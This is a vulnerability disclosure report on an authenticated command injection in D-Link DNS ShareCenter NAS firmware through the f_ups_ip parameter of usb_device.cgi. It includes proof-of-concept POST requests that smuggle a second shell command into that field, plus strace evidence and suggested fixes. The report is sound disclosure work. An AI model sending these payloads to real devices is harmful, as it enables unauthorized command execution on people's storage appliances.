# Vulnerability Submission: D-Link DNS ShareCenter usb_device.cgi OS Command Injection

## Basic Information

| Field | Value |
|-------|-------|
| VulnDB ID | Pending assignment |
| CVE ID | Pending assignment |
| CWE ID | CWE-78 |
| CVSS v3.1 Score | 8.8 |
| CVSS v3.1 Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Vulnerability Type | OS Command Injection |
| Internal ID | DLINK-CMD-005 |

## Affected Product

| Field | Value |
|-------|-------|
| Vendor | D-Link |
| Product | DNS-320L, DNS-327L, DNS-340L, DNS-345 ShareCenter |
| Confirmed Firmware Versions | DNS-320L REVA 1.10B03; DNS-327L REVA 1.10B02; DNS-340L REVA 1.01B04; DNS-345 REVA 1.01, 1.03B06, 1.04.B02, 1.05b04 HOTFIX |
| Affected Binary | cgi/usb_device.cgi |
| Web Endpoint | /cgi-bin/usb_device.cgi |
| Architecture | ARM EABI5 little-endian |
| Confirmed Binary SHA1 | DNS-320L 1.10B03: d1470206f634600a6df18c2e4770ec677e060c15; DNS-327L 1.10B02: 56612b0bf4c3645d1414b8e1ff685d98fb931bd8; DNS-340L 1.01B04: 69166e09fedeb4e7c25314253410870426eb135a; DNS-345 1.01: fbc8992a1e8f573f727bba6c2b2200541efaeafc; DNS-345 1.03B06 / 1.04.B02 / 1.05b04 HOTFIX: d69147ea2f9c83fa8978d8faf07c5334daefe609 |

## Description

The `usb_device.cgi` CGI handler implements USB and UPS management. In the authenticated UPS configuration branches, the HTTP POST parameter `f_ups_ip` is concatenated into shell command strings used to change UPS master/slave settings:

```text
UPS_Setting -M ON <f_ups_ip> > /dev/null &
UPS_Setting -S ON <f_ups_ip> > /dev/null &
```

The `GUI_ups_add` branch reaches the `UPS_Setting -M ON` command path. The `GUI_ups_slave_setting` branch reaches the `UPS_Setting -S ON` command path. Because `f_ups_ip` is not shell-metacharacter neutralized before being placed into these commands, an authenticated web attacker can inject shell metacharacters and execute arbitrary commands as the CGI process user.

The vulnerable parameter is exposed by the authenticated UPS management UI. `upsDiag.js` sends POST requests to `/cgi-bin/usb_device.cgi` with `cmd=GUI_ups_add`, `f_ups_ip`, and `f_flag`, and also sends `cmd=GUI_ups_slave_setting` with `f_ups_ip`.

## Impact

Successful exploitation allows authenticated remote command execution on the NAS appliance. The attacker can run arbitrary shell commands, alter device state, access stored data, or disrupt storage services.

This report is limited to the UPS `f_ups_ip` command-injection paths. The same verification run also covered USB storage unmount and printer-clear parameters, but those branches did not produce marker files or unescaped controlled command lines and are not claimed here.

## Proof of Concept

Low-impact marker examples:

```http
POST /cgi-bin/usb_device.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=GUI_ups_add&f_ups_ip=127.0.0.1;touch /tmp/DLINK_CMD_005_ups_add.hit;#&f_flag=0
```

```http
POST /cgi-bin/usb_device.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=GUI_ups_slave_setting&f_ups_ip=127.0.0.1;touch /tmp/DLINK_CMD_005_ups_slave.hit;#&f_flag=0
```

## Runtime Evidence

Focused verification artifacts:

- `scripts/oneoff/verify_usb_device_branch_params_20260526.py`
- `inout/reports/0day_verification_20260526/usb_device_branch_params_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/usb_device_branch_params_triage_20260526.md`
- `inout/reports/0day_verification_20260526/usb_device_duplicate_check_20260526.json`
- `inout/reports/0day_verification_20260526/usb_device_duplicate_check_20260526.md`

Runtime summary:

| Firmware | Binary SHA1 | Marker hits | Controlled shell traces |
|----------|-------------|-------------|-------------------------|
| DNS-320L 1.10B03 | d1470206f634600a6df18c2e4770ec677e060c15 | 3 | 3 |
| DNS-327L 1.10B02 | 56612b0bf4c3645d1414b8e1ff685d98fb931bd8 | 3 | 3 |
| DNS-340L 1.01B04 | 69166e09fedeb4e7c25314253410870426eb135a | 3 | 3 |
| DNS-345 1.01 | fbc8992a1e8f573f727bba6c2b2200541efaeafc | 3 | 3 |
| DNS-345 1.03B06 | d69147ea2f9c83fa8978d8faf07c5334daefe609 | 3 | 3 |
| DNS-345 1.04.B02 | d69147ea2f9c83fa8978d8faf07c5334daefe609 | 3 | 3 |
| DNS-345 1.05b04 HOTFIX | d69147ea2f9c83fa8978d8faf07c5334daefe609 | 3 | 3 |

Representative qemu strace evidence:

DNS-340L 1.01B04 `GUI_ups_add`:

```text
execve("/bin/sh",{"sh","-c","UPS_Setting -M ON 127.0.0.1;touch /tmp/FIRMREC_DNS340L_101B04_USB_DEVICE_20260526_ups_add_ip.hit;# > /dev/null & ",NULL})
```

DNS-345 1.03B06 `GUI_ups_slave_setting`:

```text
execve("/bin/sh",{"sh","-c","UPS_Setting -S ON 127.0.0.1;touch /tmp/FIRMREC_DNS345_103B06_USB_DEVICE_20260526_ups_slave_ip.hit;# > /dev/null & ",NULL})
```

The verifier created marker files in the temporary qemu sysroots for `GUI_ups_add` semicolon payloads, `GUI_ups_add` command-substitution payloads, and `GUI_ups_slave_setting` semicolon payloads across all seven tested firmware images.

## Public Duplicate Check

Public duplicate checks on 2026-05-26 did not find a directly matching public CVE or disclosure for D-Link `usb_device.cgi` command injection through `GUI_ups_add`, `GUI_ups_slave_setting`, or `f_ups_ip`.

Exact NVD/CVE/web search terms checked included:

```text
usb_device.cgi D-Link
f_ups_ip D-Link
GUI_ups_add f_ups_ip
GUI_ups_slave_setting
UPS_Setting -M ON D-Link command injection
UPS_Setting -S ON D-Link command injection
D-Link DNS-345 usb_device.cgi UPS_Setting
```

Broader D-Link NAS command-injection searches return known same-family prior art for other endpoints. Those records are relevant prior art but are not direct duplicates of the verified `usb_device.cgi` UPS `f_ups_ip` command path.

No search pass can prove global non-existence of private, vendor-only, paywalled, or poorly indexed reports. Repeat the duplicate check immediately before external filing.

## Discovery

| Field | Value |
|-------|-------|
| Discovery Method | FirmRec cross-firmware vulnerability mining plus branch-aware runtime verification |
| Date Verified | 2026-05-26 |
| Verification | Direct CGI POST probes in restored D-Link DNS rootfs images under qemu-arm-static with command markers |

## Suggested Fix

1. Replace shell-based command construction with argument-vector APIs such as `execve()` that do not invoke `/bin/sh`.
2. Treat `f_ups_ip` as an IP address list, not a shell fragment; enforce strict server-side IP-address parsing and reject unexpected characters.
3. Reject shell metacharacters, command substitutions, whitespace, separators, and malformed list entries before UPS setting changes.
4. Add server-side authorization and CSRF protections for UPS management actions.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-26 | Vulnerability verified with runtime marker evidence |
| TBD | Reported to D-Link PSIRT |
| TBD | CVE ID assigned |
| TBD | Public disclosure |
